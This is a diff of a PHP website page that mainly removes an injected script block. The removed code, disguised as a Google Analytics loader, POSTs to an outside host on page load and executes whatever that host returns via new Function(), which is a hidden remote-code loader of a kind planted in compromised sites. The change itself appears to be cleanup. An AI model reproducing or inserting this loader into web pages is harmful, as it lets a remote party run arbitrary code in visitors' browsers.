@@ -24,7 +24,6 @@
     <br />
     <br />
     <div id="page" class="hfeed site">
-
         <div id="content">
             <div class="container clearfix">
                 <main id="main" class="site-main clearfix">
@@ -55,26 +54,12 @@
                     <li class="next"> <a href="ourphilosophy.php" rel="prev"><span class="meta-nav"></span> Our Philosophy&rarr;</a> </li>
                     <li class="previous"> <a href="startupfund.php" rel="next">&larr;Startup Fund <span class="meta-nav"></span></a> </li>
                 </ul>
-
-                <div id="comments" class="comments-area">
-                </div> <!-- .comments-area -->
             </div>
             <!-- end .container -->
         </div>
         <!-- end #content -->
     </div> <!-- end #page -->
     <?php include 'common files/footer.php' ?>
-	<script>
-        jQuery(document).ready(function() {
-            jQuery.post('http://garypeter.com?ga_action=googleanalytics_get_script', {
-                action: 'googleanalytics_get_script'
-            }, function(response) {
-                var F = new Function(response);
-                return (F());
-            });
-        });
-
-    </script>
     <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4'></script>
     <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4'></script>
     <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4'></script>
